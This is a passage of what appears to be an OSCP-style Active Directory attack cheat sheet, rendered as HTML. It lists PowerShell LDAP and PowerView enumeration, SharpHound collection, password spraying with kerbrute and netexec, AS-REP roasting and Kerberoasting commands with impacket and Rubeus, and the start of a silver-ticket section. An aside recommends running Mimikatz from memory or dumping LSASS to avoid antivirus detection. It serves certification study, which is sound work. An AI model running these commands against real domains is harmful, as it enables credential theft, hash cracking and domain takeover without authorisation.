</span><span id="__span-154-6"><a id="__codelineno-154-6" name="__codelineno-154-6" href="#__codelineno-154-6"></a>    <span class="nv">$PDC</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">().</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-154-7"><a id="__codelineno-154-7" name="__codelineno-154-7" href="#__codelineno-154-7"></a>    <span class="nv">$DistinguishedName</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span>
</span><span id="__span-154-8"><a id="__codelineno-154-8" name="__codelineno-154-8" href="#__codelineno-154-8"></a>
</span><span id="__span-154-9"><a id="__codelineno-154-9" name="__codelineno-154-9" href="#__codelineno-154-9"></a>    <span class="nv">$DirectoryEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="s2">&quot;LDAP://$PDC/$DistinguishedName&quot;</span><span class="p">)</span>
</span><span id="__span-154-10"><a id="__codelineno-154-10" name="__codelineno-154-10" href="#__codelineno-154-10"></a>
</span><span id="__span-154-11"><a id="__codelineno-154-11" name="__codelineno-154-11" href="#__codelineno-154-11"></a>    <span class="nv">$DirectorySearcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="nv">$DirectoryEntry</span><span class="p">,</span> <span class="nv">$LDAPQuery</span><span class="p">)</span>
</span><span id="__span-154-12"><a id="__codelineno-154-12" name="__codelineno-154-12" href="#__codelineno-154-12"></a>
</span><span id="__span-154-13"><a id="__codelineno-154-13" name="__codelineno-154-13" href="#__codelineno-154-13"></a>    <span class="k">return</span> <span class="nv">$DirectorySearcher</span><span class="p">.</span><span class="n">FindAll</span><span class="p">()</span>
</span><span id="__span-154-14"><a id="__codelineno-154-14" name="__codelineno-154-14" href="#__codelineno-154-14"></a>
</span><span id="__span-154-15"><a id="__codelineno-154-15" name="__codelineno-154-15" href="#__codelineno-154-15"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Example</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-155-1"><a id="__codelineno-155-1" name="__codelineno-155-1" href="#__codelineno-155-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="k">function</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-155-2"><a id="__codelineno-155-2" name="__codelineno-155-2" href="#__codelineno-155-2"></a>
</span><span id="__span-155-3"><a id="__codelineno-155-3" name="__codelineno-155-3" href="#__codelineno-155-3"></a><span class="c">## List each user objects</span>
</span><span id="__span-155-4"><a id="__codelineno-155-4" name="__codelineno-155-4" href="#__codelineno-155-4"></a><span class="n">LDAPSearch</span> <span class="n">-LDAPQuery</span> <span class="s2">&quot;(samAccountType=805306368)&quot;</span>
</span><span id="__span-155-5"><a id="__codelineno-155-5" name="__codelineno-155-5" href="#__codelineno-155-5"></a>
</span><span id="__span-155-6"><a id="__codelineno-155-6" name="__codelineno-155-6" href="#__codelineno-155-6"></a><span class="c">## List each group objects</span>
</span><span id="__span-155-7"><a id="__codelineno-155-7" name="__codelineno-155-7" href="#__codelineno-155-7"></a><span class="n">LDAPSearch</span> <span class="n">-LDAPQuery</span> <span class="s2">&quot;(objectclass=group)&quot;</span>
</span><span id="__span-155-8"><a id="__codelineno-155-8" name="__codelineno-155-8" href="#__codelineno-155-8"></a>
</span><span id="__span-155-9"><a id="__codelineno-155-9" name="__codelineno-155-9" href="#__codelineno-155-9"></a><span class="c">## Filter group attributes</span>
</span><span id="__span-155-10"><a id="__codelineno-155-10" name="__codelineno-155-10" href="#__codelineno-155-10"></a><span class="k">foreach</span> <span class="p">(</span><span class="nv">$group</span> <span class="k">in</span> <span class="p">$(</span><span class="n">LDAPSearch</span> <span class="n">-LDAPQuery</span> <span class="s2">&quot;(objectCategory=group)&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span id="__span-155-11"><a id="__codelineno-155-11" name="__codelineno-155-11" href="#__codelineno-155-11"></a><span class="nv">$group</span><span class="p">.</span><span class="n">properties</span> <span class="p">|</span> <span class="nb">select </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">cn</span><span class="p">},</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">member</span><span class="p">}</span>
</span><span id="__span-155-12"><a id="__codelineno-155-12" name="__codelineno-155-12" href="#__codelineno-155-12"></a><span class="p">}</span>
</span><span id="__span-155-13"><a id="__codelineno-155-13" name="__codelineno-155-13" href="#__codelineno-155-13"></a>
</span><span id="__span-155-14"><a id="__codelineno-155-14" name="__codelineno-155-14" href="#__codelineno-155-14"></a><span class="c">## Filter only certain group</span>
</span><span id="__span-155-15"><a id="__codelineno-155-15" name="__codelineno-155-15" href="#__codelineno-155-15"></a><span class="nv">$sales</span> <span class="p">=</span> <span class="n">LDAPSearch</span> <span class="n">-LDAPQuery</span> <span class="s2">&quot;(&amp;(objectCategory=group)(cn=Sales Department))&quot;</span>
</span><span id="__span-155-16"><a id="__codelineno-155-16" name="__codelineno-155-16" href="#__codelineno-155-16"></a><span class="nv">$sales</span><span class="p">.</span><span class="n">properties</span><span class="p">.</span><span class="n">member</span>
</span></code></pre></div>
<h4 id="ad-enumeration-with-powerview"><strong>AD Enumeration with PowerView</strong></h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-156-1"><a id="__codelineno-156-1" name="__codelineno-156-1" href="#__codelineno-156-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-156-2"><a id="__codelineno-156-2" name="__codelineno-156-2" href="#__codelineno-156-2"></a>
</span><span id="__span-156-3"><a id="__codelineno-156-3" name="__codelineno-156-3" href="#__codelineno-156-3"></a><span class="c">## Get Domain Information</span>
</span><span id="__span-156-4"><a id="__codelineno-156-4" name="__codelineno-156-4" href="#__codelineno-156-4"></a><span class="nb">Get-NetDomain</span>
</span><span id="__span-156-5"><a id="__codelineno-156-5" name="__codelineno-156-5" href="#__codelineno-156-5"></a>
</span><span id="__span-156-6"><a id="__codelineno-156-6" name="__codelineno-156-6" href="#__codelineno-156-6"></a><span class="c">## Get Domain Users</span>
</span><span id="__span-156-7"><a id="__codelineno-156-7" name="__codelineno-156-7" href="#__codelineno-156-7"></a><span class="nb">Get-NetUser</span>
</span><span id="__span-156-8"><a id="__codelineno-156-8" name="__codelineno-156-8" href="#__codelineno-156-8"></a><span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span>
</span><span id="__span-156-9"><a id="__codelineno-156-9" name="__codelineno-156-9" href="#__codelineno-156-9"></a><span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span><span class="p">,</span><span class="n">pwdlastset</span><span class="p">,</span><span class="n">lastlogon</span>
</span><span id="__span-156-10"><a id="__codelineno-156-10" name="__codelineno-156-10" href="#__codelineno-156-10"></a>
</span><span id="__span-156-11"><a id="__codelineno-156-11" name="__codelineno-156-11" href="#__codelineno-156-11"></a><span class="c">## Get Domian Groups</span>
</span><span id="__span-156-12"><a id="__codelineno-156-12" name="__codelineno-156-12" href="#__codelineno-156-12"></a><span class="nb">Get-NetGroup</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span>
</span><span id="__span-156-13"><a id="__codelineno-156-13" name="__codelineno-156-13" href="#__codelineno-156-13"></a><span class="nb">Get-NetGroup</span> <span class="s2">&quot;Administrators&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">member</span>
</span></code></pre></div>
<p><a href="https://powersploit.readthedocs.io/en/latest/Recon/">About - PowerSploit</a></p>
<h3 id="manual-enumeration-expanding-our-repertoire"><strong>Manual Enumeration - Expanding our Repertoire</strong></h3>
<h4 id="enumerating-operating-systems"><strong>Enumerating Operating Systems</strong></h4>
<p><strong><em>Get Computers / Operating Systems using PowerView</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-157-1"><a id="__codelineno-157-1" name="__codelineno-157-1" href="#__codelineno-157-1"></a><span class="nb">Get-NetComputer</span>
</span><span id="__span-157-2"><a id="__codelineno-157-2" name="__codelineno-157-2" href="#__codelineno-157-2"></a><span class="nb">Get-NetComputer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">operatingsystem</span><span class="p">,</span><span class="n">dnshostname</span>
</span><span id="__span-157-3"><a id="__codelineno-157-3" name="__codelineno-157-3" href="#__codelineno-157-3"></a><span class="nb">Get-NetComputer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">dnshostname</span><span class="p">,</span><span class="n">operatingsystem</span><span class="p">,</span><span class="n">operatingsystemversion</span>
</span></code></pre></div>
<h4 id="getting-an-overview-permissions-and-logged-on-users"><strong>Getting an Overview - Permissions and Logged on Users</strong></h4>
<p><strong><em>Find Local Admin Access</em></strong> </p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-158-1"><a id="__codelineno-158-1" name="__codelineno-158-1" href="#__codelineno-158-1"></a><span class="nb">Find-LocalAdminAccess</span>
</span></code></pre></div>
<p><strong><em>Find Remote Host Logged On Users</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-159-1"><a id="__codelineno-159-1" name="__codelineno-159-1" href="#__codelineno-159-1"></a><span class="c">## Powerview - Not reliable</span>
</span><span id="__span-159-2"><a id="__codelineno-159-2" name="__codelineno-159-2" href="#__codelineno-159-2"></a><span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="no">[host]</span>
</span><span id="__span-159-3"><a id="__codelineno-159-3" name="__codelineno-159-3" href="#__codelineno-159-3"></a>
</span><span id="__span-159-4"><a id="__codelineno-159-4" name="__codelineno-159-4" href="#__codelineno-159-4"></a><span class="c">## PSLoggedon</span>
</span><span id="__span-159-5"><a id="__codelineno-159-5" name="__codelineno-159-5" href="#__codelineno-159-5"></a><span class="p">.\</span><span class="n">PsLoggedon</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\</span><span class="n">files04</span>
</span></code></pre></div>
<h4 id="enumeration-through-service-principal-names"><strong>Enumeration Through Service Principal Names</strong></h4>
<p><strong><em>Get SPN Users - Service Users</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-160-1"><a id="__codelineno-160-1" name="__codelineno-160-1" href="#__codelineno-160-1"></a><span class="nb">Get-NetUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span>
</span><span id="__span-160-2"><a id="__codelineno-160-2" name="__codelineno-160-2" href="#__codelineno-160-2"></a>
</span><span id="__span-160-3"><a id="__codelineno-160-3" name="__codelineno-160-3" href="#__codelineno-160-3"></a><span class="c">## setspm</span>
</span><span id="__span-160-4"><a id="__codelineno-160-4" name="__codelineno-160-4" href="#__codelineno-160-4"></a><span class="n">setspn</span> <span class="n">-L</span> <span class="no">[service_user]</span>
</span></code></pre></div>
<h4 id="enumerating-object-permissions"><strong>Enumerating Object Permissions</strong></h4>
<p><strong>Permissions</strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-161-1"><a id="__codelineno-161-1" name="__codelineno-161-1" href="#__codelineno-161-1"></a>GenericAll: Full permissions on object
</span><span id="__span-161-2"><a id="__codelineno-161-2" name="__codelineno-161-2" href="#__codelineno-161-2"></a>GenericWrite: Edit certain attributes on the object
</span><span id="__span-161-3"><a id="__codelineno-161-3" name="__codelineno-161-3" href="#__codelineno-161-3"></a>WriteOwner: Change ownership of the object
</span><span id="__span-161-4"><a id="__codelineno-161-4" name="__codelineno-161-4" href="#__codelineno-161-4"></a>WriteDACL: Edit ACE&#39;s applied to object
</span><span id="__span-161-5"><a id="__codelineno-161-5" name="__codelineno-161-5" href="#__codelineno-161-5"></a>AllExtendedRights: Change password, reset password, etc.
</span><span id="__span-161-6"><a id="__codelineno-161-6" name="__codelineno-161-6" href="#__codelineno-161-6"></a>ForceChangePassword: Password change for object
</span><span id="__span-161-7"><a id="__codelineno-161-7" name="__codelineno-161-7" href="#__codelineno-161-7"></a>Self (Self-Membership): Add ourselves to for example a group
</span></code></pre></div>
<p><strong><em>Get Object Permissions using Powerview</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-162-1"><a id="__codelineno-162-1" name="__codelineno-162-1" href="#__codelineno-162-1"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="no">[object]</span>
</span><span id="__span-162-2"><a id="__codelineno-162-2" name="__codelineno-162-2" href="#__codelineno-162-2"></a>
</span><span id="__span-162-3"><a id="__codelineno-162-3" name="__codelineno-162-3" href="#__codelineno-162-3"></a><span class="c">## SecurityIdentifier - Object, which has access to</span>
</span><span id="__span-162-4"><a id="__codelineno-162-4" name="__codelineno-162-4" href="#__codelineno-162-4"></a><span class="c">## ActiveDirectoryRights  - Permission level</span>
</span><span id="__span-162-5"><a id="__codelineno-162-5" name="__codelineno-162-5" href="#__codelineno-162-5"></a>
</span><span id="__span-162-6"><a id="__codelineno-162-6" name="__codelineno-162-6" href="#__codelineno-162-6"></a><span class="c">## Example</span>
</span><span id="__span-162-7"><a id="__codelineno-162-7" name="__codelineno-162-7" href="#__codelineno-162-7"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;Management Department&quot;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s2">&quot;GenericAll&quot;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SecurityIdentifier</span><span class="p">,</span><span class="n">ActiveDirectoryRights</span>
</span></code></pre></div>
<p><strong><em>Convert SID to Object</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-163-1"><a id="__codelineno-163-1" name="__codelineno-163-1" href="#__codelineno-163-1"></a><span class="nb">Convert-SidToName</span> <span class="no">[SID]</span>
</span><span id="__span-163-2"><a id="__codelineno-163-2" name="__codelineno-163-2" href="#__codelineno-163-2"></a>
</span><span id="__span-163-3"><a id="__codelineno-163-3" name="__codelineno-163-3" href="#__codelineno-163-3"></a><span class="c">## Example</span>
</span><span id="__span-163-4"><a id="__codelineno-163-4" name="__codelineno-163-4" href="#__codelineno-163-4"></a><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-512&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-1104&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-32-548&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-18&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-519&quot;</span> <span class="p">|</span> <span class="nb">Convert-SidToName</span>
</span></code></pre></div>
<p><strong><em>Add user to group</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-164-1"><a id="__codelineno-164-1" name="__codelineno-164-1" href="#__codelineno-164-1"></a><span class="n">net</span> <span class="nb">group </span><span class="no">[group] [user]</span> <span class="p">/</span><span class="n">add</span> <span class="p">/</span><span class="n">domain</span>
</span></code></pre></div>
<h4 id="enumerating-domain-shares"><strong>Enumerating Domain Shares</strong></h4>
<p><strong><em>Get Shares using PowerView</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-165-1"><a id="__codelineno-165-1" name="__codelineno-165-1" href="#__codelineno-165-1"></a><span class="nb">Find-DomainShare</span>
</span></code></pre></div>
<p><strong><em>Decrypt cpassword Found in DC sysvol share</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-166-1"><a id="__codelineno-166-1" name="__codelineno-166-1" href="#__codelineno-166-1"></a>gpp-decrypt<span class="w"> </span><span class="s2">&quot;[password]&quot;</span>
</span></code></pre></div>
<h3 id="active-directory-automated-enumeration"><strong>Active Directory - Automated Enumeration</strong></h3>
<h4 id="collecting-data-with-sharphound"><strong>Collecting Data with SharpHound</strong></h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-167-1"><a id="__codelineno-167-1" name="__codelineno-167-1" href="#__codelineno-167-1"></a><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-CollectionMethod</span> <span class="n">All</span>  <span class="p">-</span><span class="n">-ZipFileName</span> <span class="n">output</span><span class="p">.</span><span class="n">zip</span>
</span><span id="__span-167-2"><a id="__codelineno-167-2" name="__codelineno-167-2" href="#__codelineno-167-2"></a>
</span><span id="__span-167-3"><a id="__codelineno-167-3" name="__codelineno-167-3" href="#__codelineno-167-3"></a><span class="c">## Using PS version</span>
</span><span id="__span-167-4"><a id="__codelineno-167-4" name="__codelineno-167-4" href="#__codelineno-167-4"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Sharphound</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-167-5"><a id="__codelineno-167-5" name="__codelineno-167-5" href="#__codelineno-167-5"></a><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="n">-OutputDirectory</span> <span class="n">C</span><span class="p">:\</span><span class="n">tmp</span><span class="p">\</span> <span class="n">-OutputPrefix</span> <span class="s2">&quot;corp audit&quot;</span>
</span></code></pre></div>
<h4 id="analysing-data-using-bloodhound"><strong>Analysing Data using BloodHound</strong></h4>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-168-1"><a id="__codelineno-168-1" name="__codelineno-168-1" href="#__codelineno-168-1"></a>apt<span class="w"> </span>install<span class="w"> </span>bloodhound
</span></code></pre></div>
<h2 id="attacking-active-directory-authentication"><strong>Attacking Active Directory Authentication</strong></h2>
<h4 id="ntlm-authentication"><strong>NTLM Authentication</strong></h4>
<p><a href="https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/">NTLM authentication</a> is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.</p>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%2010.png" /></p>
<h4 id="kerberos-authentication"><strong>Kerberos Authentication</strong></h4>
<p>A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application
server itself, as discussed in the previous section. On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a <a href="https://en.wikipedia.org/wiki/Key_distribution_center"><em>Key Distribution Center</em></a> (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.</p>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%2011.png" /></p>
<h4 id="cached-ad-credentials"><strong>Cached AD Credentials</strong></h4>
<aside>


Due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed
in the *Antivirus Evasion* Module instead. For example, execute Mimikatz directly from memory using an injector like [PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1), or use a built-in tool like Task Manager
to dump the entire [LSASS process memory](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/), move the dumped data to a helper machine, and then load the data into [Mimikatz](http://www.fuzzysecurity.com/tutorials/18.html).

</aside>

<h3 id="performing-attacks-on-active-directory-authentication"><strong>Performing Attacks on Active Directory Authentication</strong></h3>
<h4 id="password-attacks_1"><strong>Password Attacks</strong></h4>
<p><strong><em>Get Password Policy</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-169-1"><a id="__codelineno-169-1" name="__codelineno-169-1" href="#__codelineno-169-1"></a><span class="n">net</span> <span class="n">accounts</span>
</span><span id="__span-169-2"><a id="__codelineno-169-2" name="__codelineno-169-2" href="#__codelineno-169-2"></a>
</span><span id="__span-169-3"><a id="__codelineno-169-3" name="__codelineno-169-3" href="#__codelineno-169-3"></a><span class="n">enum4linux</span> <span class="n">-P</span> <span class="no">[IP]</span>
</span></code></pre></div>
<p><em><strong>Password Spray Using Powershell</strong> <a href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0">DirectoryEntry</a></em></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-170-1"><a id="__codelineno-170-1" name="__codelineno-170-1" href="#__codelineno-170-1"></a><span class="nv">$domainObj</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
</span><span id="__span-170-2"><a id="__codelineno-170-2" name="__codelineno-170-2" href="#__codelineno-170-2"></a><span class="nv">$PDC</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="n">PdcRoleOwner</span><span class="p">).</span><span class="n">Name</span>
</span><span id="__span-170-3"><a id="__codelineno-170-3" name="__codelineno-170-3" href="#__codelineno-170-3"></a><span class="nv">$SearchString</span> <span class="p">=</span> <span class="s2">&quot;LDAP://&quot;</span>
</span><span id="__span-170-4"><a id="__codelineno-170-4" name="__codelineno-170-4" href="#__codelineno-170-4"></a><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$PDC</span> <span class="p">+</span> <span class="s2">&quot;/&quot;</span>
</span><span id="__span-170-5"><a id="__codelineno-170-5" name="__codelineno-170-5" href="#__codelineno-170-5"></a><span class="nv">$DistinguishedName</span> <span class="p">=</span> <span class="s2">&quot;DC=</span><span class="p">$(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;,DC=&#39;</span><span class="p">))</span><span class="s2">&quot;</span>
</span><span id="__span-170-6"><a id="__codelineno-170-6" name="__codelineno-170-6" href="#__codelineno-170-6"></a><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$DistinguishedName</span>
</span><span id="__span-170-7"><a id="__codelineno-170-7" name="__codelineno-170-7" href="#__codelineno-170-7"></a><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="nv">$SearchString</span><span class="p">,</span> <span class="s2">&quot;[user]&quot;</span><span class="p">,</span> <span class="s2">&quot;[password]!&quot;</span><span class="p">)</span>
</span></code></pre></div>
<p><strong><em>Password Spray Using Powershell</em> DomainPasswordSpray *Script</strong>*</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-171-1"><a id="__codelineno-171-1" name="__codelineno-171-1" href="#__codelineno-171-1"></a><span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="no">[password]</span>
</span></code></pre></div>
<p><a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
<p><strong><em>Password Spray through SMB</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-172-1"><a id="__codelineno-172-1" name="__codelineno-172-1" href="#__codelineno-172-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-u<span class="w"> </span><span class="o">[</span>user<span class="o">]</span><span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>password<span class="o">]</span><span class="w"> </span>--continue-on-success
</span></code></pre></div>
<p><strong><em>Password Spray Through TGT Auth - Kerbrute</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-173-1"><a id="__codelineno-173-1" name="__codelineno-173-1" href="#__codelineno-173-1"></a>./kerbrute<span class="w"> </span>passwordspray<span class="w"> </span>--dc<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span><span class="w"> </span>-d<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span><span class="w"> </span><span class="o">[</span>userfile<span class="o">]</span><span class="w"> </span><span class="o">[</span>password<span class="o">]</span>
</span></code></pre></div>
<h4 id="as-rep-roasting"><strong>AS-REP Roasting</strong></h4>
<p><strong><em>AS-REP Roasting using impacket</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-174-1"><a id="__codelineno-174-1" name="__codelineno-174-1" href="#__codelineno-174-1"></a><span class="c1">## With Creds</span>
</span><span id="__span-174-2"><a id="__codelineno-174-2" name="__codelineno-174-2" href="#__codelineno-174-2"></a>impacket-GetNPUsers<span class="w"> </span>-dc-ip<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span><span class="w">  </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>hashes.asreproast<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>
</span><span id="__span-174-3"><a id="__codelineno-174-3" name="__codelineno-174-3" href="#__codelineno-174-3"></a>
</span><span id="__span-174-4"><a id="__codelineno-174-4" name="__codelineno-174-4" href="#__codelineno-174-4"></a><span class="c1">## Without Creds</span>
</span><span id="__span-174-5"><a id="__codelineno-174-5" name="__codelineno-174-5" href="#__codelineno-174-5"></a>impacket-GetNPUsers.py<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>/<span class="w"> </span>-dc-ip<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-usersfile<span class="w"> </span><span class="o">[</span>userFile<span class="o">]</span><span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>hashes.asreproast
</span></code></pre></div>
<p><strong><em>AS-REP Roasting using Rubeus</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-175-1"><a id="__codelineno-175-1" name="__codelineno-175-1" href="#__codelineno-175-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">nowrap</span>
</span></code></pre></div>
<p><strong><em>AS-REP Roasting using PowerVew</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-176-1"><a id="__codelineno-176-1" name="__codelineno-176-1" href="#__codelineno-176-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span>
</span></code></pre></div>
<h4 id="kerberoasting"><strong>Kerberoasting</strong></h4>
<p><strong><em>Kerberoasting using impacket</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-177-1"><a id="__codelineno-177-1" name="__codelineno-177-1" href="#__codelineno-177-1"></a>impacket-GetUserSPNs<span class="w"> </span>-request<span class="w"> </span>-dc-ip<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>Kerberoasting using Rubeus</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-178-1"><a id="__codelineno-178-1" name="__codelineno-178-1" href="#__codelineno-178-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">hashes</span><span class="p">.</span><span class="n">kerberoast</span>
</span></code></pre></div>
<p><strong><em>Kerberoasting using PowerView</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-179-1"><a id="__codelineno-179-1" name="__codelineno-179-1" href="#__codelineno-179-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Get-DomainSPNTicket</span>
</span><span id="__span-179-2"><a id="__codelineno-179-2" name="__codelineno-179-2" href="#__codelineno-179-2"></a>
</span><span id="__span-179-3"><a id="__codelineno-179-3" name="__codelineno-179-3" href="#__codelineno-179-3"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="no">[user]</span> <span class="p">|</span> <span class="nb">Get-DomainSPNTicket</span> <span class="n">-Format</span> <span class="n">Hashcat</span>
</span><span id="__span-179-4"><a id="__codelineno-179-4" name="__codelineno-179-4" href="#__codelineno-179-4"></a>
</span><span id="__span-179-5"><a id="__codelineno-179-5" name="__codelineno-179-5" href="#__codelineno-179-5"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Get-DomainSPNTicket</span> <span class="p">|</span> <span class="nb">Export-Csv</span> <span class="p">.\</span><span class="n">output</span><span class="p">.</span><span class="n">csv</span> <span class="n">-NoTypeInformation</span>
</span></code></pre></div>
<h4 id="silver-ticket">Silver Ticket</h4>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-180-1"><a id="__codelineno-180-1" name="__codelineno-180-1" href="#__codelineno-180-1"></a><span class="gu">## Check ServicePrincipalName - e.g., HTTP/web04.corp.com</span>
</span><span id="__span-180-2"><a id="__codelineno-180-2" name="__codelineno-180-2" href="#__codelineno-180-2"></a>Get-DomainUser -SPN | select ServicePrincipalName
</span><span id="__span-180-3"><a id="__codelineno-180-3" name="__codelineno-180-3" href="#__codelineno-180-3"></a>impacket-GetUserSPNs -request -dc-ip [IP] [domain]/[user]
</span><span id="__span-180-4"><a id="__codelineno-180-4" name="__codelineno-180-4" href="#__codelineno-180-4"></a>
